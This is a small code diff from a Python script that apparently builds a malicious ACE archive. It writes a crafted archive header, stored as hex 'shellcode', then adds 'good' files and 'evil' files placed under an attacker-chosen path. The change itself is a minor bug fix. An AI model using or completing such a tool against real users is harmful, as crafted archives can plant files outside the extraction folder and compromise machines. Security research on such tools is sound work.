@@ -95,8 +95,9 @@ if __name__ == '__main__':
     header_shellcode = '6B2831000000902A2A4143452A2A141402001018564E974FF6AA00000000162A554E524547495354455245442056455253494F4E2A'
     writeShellcode(header_shellcode,args.filename)
     
-    for i in args.good:
-        buildFile(i,'',args.filename)
+    if args.good:
+        for i in args.good:
+            buildFile(i,'',args.filename)
         
     for i in args.evil:
         path = args.path + i
